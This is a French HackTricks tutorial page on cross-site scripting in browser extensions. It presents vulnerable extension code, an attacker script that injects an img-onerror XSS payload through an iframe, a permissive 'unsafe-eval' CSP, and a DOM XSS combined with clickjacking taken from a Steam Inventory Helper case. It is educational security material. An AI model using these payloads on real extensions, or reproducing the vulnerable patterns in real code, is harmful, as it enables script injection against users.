# BrowExt - Exemple de XSS

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Cross-Site Scripting (XSS) via Iframe

Dans cette configuration, un **script de contenu** est impl√©ment√© pour instancier un Iframe, incorporant une URL avec des param√®tres de requ√™te comme source de l'Iframe :
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
Une page HTML publiquement accessible, **`message.html`**, est con√ßue pour ajouter dynamiquement du contenu au corps du document en fonction des param√®tres dans l'URL :
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
Un script malveillant est ex√©cut√© sur la page d'un adversaire, modifiant le param√®tre `content` de la source de l'Iframe pour introduire une **charge utile XSS**. Cela est r√©alis√© en mettant √† jour la source de l'Iframe pour inclure un script nuisible :
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
Une politique de s√©curit√© du contenu excessivement permissive telle que :
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
Permet l'ex√©cution de JavaScript, rendant le syst√®me vuln√©rable aux attaques XSS.

Une approche alternative pour provoquer le XSS consiste √† cr√©er un √©l√©ment Iframe et √† d√©finir sa source pour inclure le script malveillant en tant que param√®tre `content`:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## XSS bas√© sur le DOM + ClickJacking

Cet exemple a √©t√© tir√© du [post original](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

Le probl√®me principal d√©coule d'une vuln√©rabilit√© de type Cross-site Scripting (XSS) bas√©e sur le DOM situ√©e dans **`/html/bookmarks.html`**. Le JavaScript probl√©matique, faisant partie de **`bookmarks.js`**, est d√©taill√© ci-dessous:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Ce fragment extrait la **valeur** du champ de saisie **`txtName`** et utilise la **concat√©nation de cha√Ænes pour g√©n√©rer du HTML**, qui est ensuite ajout√© au DOM √† l'aide de la fonction `.append()` de jQuery.

En g√©n√©ral, la **Politique de s√©curit√© du contenu (CSP)** de l'extension Chrome emp√™cherait de telles vuln√©rabilit√©s. Cependant, en raison de la **relaxation de la CSP avec 'unsafe-eval'** et de l'utilisation des m√©thodes de manipulation du DOM de jQuery (qui utilisent [`globalEval()`](https://api.jquery.com/jquery.globaleval/) pour transmettre des scripts √† [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) lors de l'insertion dans le DOM), l'exploitation reste possible.

Bien que cette vuln√©rabilit√© soit significative, son exploitation d√©pend g√©n√©ralement de l'interaction de l'utilisateur : visiter la page, saisir une charge utile XSS et activer le bouton "Ajouter".

Pour renforcer cette vuln√©rabilit√©, une deuxi√®me vuln√©rabilit√© de **clickjacking** est exploit√©e. Le manifeste de l'extension Chrome pr√©sente une politique √©tendue `web_accessible_resources` :
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Notamment, la page **`/html/bookmarks.html`** est sujette au cadrage, donc vuln√©rable au **clickjacking**. Cette vuln√©rabilit√© est exploit√©e pour encadrer la page dans le site d'un attaquant, la recouvrant avec des √©l√©ments DOM pour redessiner l'interface de mani√®re trompeuse. Cette manipulation am√®ne les victimes √† interagir involontairement avec l'extension sous-jacente.

## R√©f√©rences

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
